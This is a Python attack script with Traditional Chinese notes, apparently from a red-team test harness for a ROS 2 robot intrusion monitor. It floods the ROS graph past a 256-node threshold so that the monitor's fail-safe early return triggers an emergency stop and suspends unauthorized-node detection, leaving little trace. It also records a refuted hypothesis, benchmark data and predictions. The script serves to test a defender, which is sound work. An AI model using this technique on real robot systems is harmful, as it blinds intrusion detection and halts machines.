#!/usr/bin/env python3
"""N36 — graph 溢位：用 fail-safe 把偵測器關掉。

## 這一支打的是什麼

`monitor_node._check_graph()` 的第一件事是：

    if graph_nodes is None or len(graph_nodes) > _GRAPH_NODE_MAX:   # 256
        _record_graph_transition(self, "overflow", len(graph_nodes))
        self.get_logger().error(...)
        if now - self._last_graph_overflow_alert >= 30.0:           # 冷卻
            self._publish(...)
            if self._emergency_stop:
                self._trigger_emergency_stop()
        return                          # ← **提早 return**

那個 `return` 是重點。超過 256 個 node 之後：

1. **機器人被緊急停止**（`_trigger_emergency_stop`）。
2. **白名單比對整段不執行**——溢位期間 monitor **停止偵測未授權節點**。
3. 證據極少：
   - `_record_graph_transition` **只在狀態改變時發**，所以持續溢位只留下
     **一筆** `graph_state` 事件；
   - 溢位告警有 **30 秒冷卻**，而特徵視窗是 8 秒。

也就是說，這是一個 **fail-safe 被觸發時關掉了它自己要保護的偵測器**，
而且幾乎不留痕跡。攻擊者可以拿溢位當掩護做別的事。

## ⚠️ 被推翻的第一版假說（保留紀錄）

原本設計的機制是「心跳餓死」：monitor 是單執行緒（`rclpy.spin`，且不訂閱
任何 topic），`_check_graph` 的成本隨 graph 成長，而守衛心跳租約 5.0 秒 <
IDS 告警門檻 10.0 秒 ⇒ 灌大 graph 讓心跳落在中間，機器人停住而沒有告警。

**跑 live 之前先做了微基準，那個機制不成立**：

    graph 裡的 node 數     get_node_names_and_namespaces() 中位數
              0                    0.01 ms
            100                    0.10 ms
            200                    0.36 ms
            400                    0.05 ms（最大 2.6 ms）

離餓死一個 2 秒的計時器差三個數量級。**查詢不是成本所在。**
那三個常數之間的不等式（5.0 < 10.0）仍然存在，只是這條路到不了它。

## 事前寫下的預測（跑完不改口）

- **P1**：node 數越過 **256** 時出現 `graph_state` 事件，`state="overflow"`，
  而且**整場只有一筆**（狀態轉換才發）。
- **P2**：溢位期間**不會**出現 `unknown_node` 事件——即使我們建了數百個
  不在白名單上的 node。這是 `return` 造成的偵測空窗，也是本支最重要的斷言。
  若 P2 被推翻（仍有 unknown_node），代表我讀錯了控制流。
- **P3**：45 秒的攻擊最多留下 **2 筆**溢位告警（30 秒冷卻）。
- **P4**：**Enforce 下打不到**。未認證 participant 不進入握手（C2C-014），
  不會出現在防守方的 graph 視圖裡。若 P4 被推翻，那比 P1–P3 都值得寫。

既有 640 場裡 `graph_state` 事件出現 **0 次**（探針自我驗證過：同一批資料
找得到 `guard_state`、`detector_state`、`participant_change`），所以這不是
既有攻擊的副作用——`spdp_flood` 最多 60 個 participant，到不了 256。

## 安全界線

沒有憑證、沒有 HMAC 金鑰、沒有遙測 socket、不需要 root。
node 數有硬上限——DDS discovery 是 O(n²)，開太大會讓**攻擊者自己**先掛掉，
而那在遙測上與「防禦擋下了」難以分辨（C2C-020 記過同一種混淆）。

## 用法

    python3 N36_graph_overflow.py <duration_sec> \\
        [--start 60] [--step 40] [--step-sec 3.0] [--max-nodes 320]

stdout 逐步印出「時間戳 → 目前 node 數」，供與防守端遙測對齊；
攻擊端看不到 monitor 的狀態，判定一律由防守端的 `graph_state` 決定。
"""

from __future__ import annotations

import argparse
import os
import signal
import sys
import time

import rclpy
from rclpy.executors import ExternalShutdownException
from rclpy.node import Node

_STOP = False


def _on_terminate(_signum, _frame) -> None:
    """orchestrator 結束這一場時,立刻跳出迴圈去走快速收尾。

    沒有這個的話,行程會撐到自己的 deadline 才開始收尾,而收尾又慢的話
    就會被 SIGKILL——那會讓 manifest 記 return_code=-9,整場證據被
    證據排他性 gate 判成「攻擊沒有執行」。
    """
    global _STOP
    _STOP = True

MAX_DURATION_SEC = 300.0
# 收尾預算。實測建立節點在數量變多之後會明顯變慢（2026-09-19 第二輪：
# 步距設 3.0 秒，實際間隔 3.0 → 4.5 → 5.6 → 5.8 → 8.3 → 8.2 秒），
# 所以**內層建立迴圈也必須看 deadline**，否則會衝過自己的時限才開始收尾，
# 被 orchestrator SIGKILL，整場證據以 return_code=-9 作廢。
TEARDOWN_RESERVE_SEC = 20.0
MAX_NODES_HARD = 600
MIN_NODES = 1
# `monitor_node._GRAPH_NODE_MAX`。這裡只作為 log 的參考點，不是控制流——
# 防守端改了門檻而這裡沒跟上時，爬升仍然會跨過它。
DEFENDER_GRAPH_NODE_MAX = 256


def _make_node(index: int) -> Node:
    """一個 node ＝ graph 裡的一筆。名稱必須合法：[A-Za-z_][A-Za-z0-9_]*。"""
    return Node(
        f"n36_overflow_probe_{index:04d}",
        namespace=f"/n36/overflow/depth_{index % 8}",
    )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("duration_sec", nargs="?", type=float, default=60.0)
    parser.add_argument("--start", type=int, default=60)
    parser.add_argument("--step", type=int, default=40)
    parser.add_argument("--step-sec", type=float, default=3.0)
    parser.add_argument("--max-nodes", type=int, default=320)
    return parser


def main() -> int:
    args = build_parser().parse_args()
    duration = max(1.0, min(float(args.duration_sec), MAX_DURATION_SEC))
    ceiling = max(MIN_NODES, min(int(args.max_nodes), MAX_NODES_HARD))
    start = max(MIN_NODES, min(int(args.start), ceiling))
    step = max(1, int(args.step))
    step_sec = max(0.5, float(args.step_sec))

    print(f"☠️ N36: graph 爬升 {start} → {ceiling} 個 node，每 {step_sec:.1f}s "
          f"加 {step} 個，總時長 {duration:.1f}s", flush=True)
    print(f"   防守端的門檻是 {DEFENDER_GRAPH_NODE_MAX} 個 node；"
          "判定看防守端有沒有 graph_state state=overflow", flush=True)

    signal.signal(signal.SIGTERM, _on_terminate)
    signal.signal(signal.SIGINT, _on_terminate)

    rclpy.init()
    nodes: list[Node] = []
    t0 = time.monotonic()
    # orchestrator 期待行程在 duration 之內結束，所以**主迴圈**就要提早收手，
    # 收尾才有時間跑完。
    #
    # 2026-09-19 第四輪錯在這裡：預算只讓它停止「建立」，主迴圈仍然跑滿
    # deadline，收尾一開始就必然超時（74.1s vs 70s）→ SIGKILL → 整場證據
    # 以 return_code=-9 作廢。
    hard_deadline = t0 + duration
    deadline = hard_deadline - TEARDOWN_RESERVE_SEC
    # 過了這個點就不再建立新 node，只維持——維持才是重點：
    # monitor 每 5 秒輪詢一次，溢位要撐過至少一次輪詢才會被記錄。
    build_until = deadline - 5.0
    next_step = t0
    crossed = False
    trail: list[tuple[float, int]] = []
    try:
        while not _STOP and time.monotonic() < deadline and rclpy.ok():
            now = time.monotonic()
            if now >= next_step and len(nodes) < ceiling and now < build_until:
                target = min(ceiling, start if not nodes else len(nodes) + step)
                while (not _STOP and len(nodes) < target and rclpy.ok()
                       and time.monotonic() < build_until):
                    try:
                        nodes.append(_make_node(len(nodes)))
                    except Exception as exc:          # 攻擊端自己撐不住
                        print(f"   ⚠️ 建到第 {len(nodes)} 個就失敗：{exc}",
                              flush=True)
                        ceiling = target = len(nodes)
                        break
                trail.append((round(now - t0, 2), len(nodes)))
                note = ""
                if not crossed and len(nodes) > DEFENDER_GRAPH_NODE_MAX:
                    crossed = True
                    note = "  ← 已越過防守端門檻"
                print(f"   t={now - t0:6.2f}s  node={len(nodes)}{note}",
                      flush=True)
                next_step = now + step_sec
            if nodes:
                # 只 spin 一個：負擔來自這些 node 在 graph 裡的**存在**。
                rclpy.spin_once(nodes[0], timeout_sec=0.05)
            else:
                time.sleep(0.05)
    except (KeyboardInterrupt, ExternalShutdownException):
        pass
    finally:
        peak = len(nodes)
        # ⚠️ **不要**逐一 destroy_node()。
        #
        # 2026-09-19 第一次 live 就是這樣被判作廢的：340 個 node 逐一銷毀要
        # 11.92 秒,超過 orchestrator 的寬限期 → 行程被 SIGKILL → manifest 記
        # return_code=-9 → 證據排他性 gate 判 `void_attack_did_not_run`。
        # 攻擊其實完整執行了（遙測有 graph_state overflow node_count=339）,
        # 但整場證據因為收尾太慢而作廢。
        #
        # 實測同樣 340 個 node：逐一 destroy 11.92s,只呼叫一次 shutdown 1.92s。
        # context 關掉就會一起收,不需要一個一個來。
        try:
            rclpy.shutdown()
        except Exception:
            pass
        print(f"⏹ N36 結束：峰值 {peak} 個 node（門檻 "
              f"{DEFENDER_GRAPH_NODE_MAX}），歷時 "
              f"{time.monotonic() - t0:.1f}s", flush=True)
        print(f"   爬升軌跡 {trail}", flush=True)
        # 硬退。
        #
        # 2026-09-19 第五輪:主迴圈與收尾都在時限內跑完(57.1s / 70s),
        # 收尾訊息也印出來了,行程卻仍然拿到 return_code=-9——**直譯器在
        # 退出時卡住**,332 個 participant 的 Fast DDS 清理沒有結束。
        # 對攻擊端而言沒有需要保留的狀態,OS 會回收;而多撐那幾秒會讓整場
        # 證據以「攻擊沒有執行」作廢。先 flush 再 _exit。
        sys.stdout.flush()
        sys.stderr.flush()
        os._exit(0)
    return 0


if __name__ == "__main__":
    sys.exit(main())
